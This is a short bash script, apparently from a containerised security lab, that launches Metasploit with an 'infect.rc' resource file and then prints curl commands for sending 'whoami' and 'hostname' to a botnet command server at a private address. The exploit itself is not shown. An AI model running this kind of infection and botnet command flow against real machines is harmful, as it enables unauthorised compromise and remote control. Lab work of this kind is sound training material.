#!/bin/bash

docker exec -it attacker /usr/src/metasploit-framework/msfconsole -r /attack/infect.rc

echo ""
echo "=== Attack Complete ==="
echo ""
echo "Test the botnet by sending commands:"
echo "  curl http://172.18.0.2:9000/set/whoami"
echo "  curl http://172.18.0.2:9000/set/hostname"
echo ""
echo "Check bot logs:"
echo "  docker exec bot1 tail -f /tmp/bot.log"
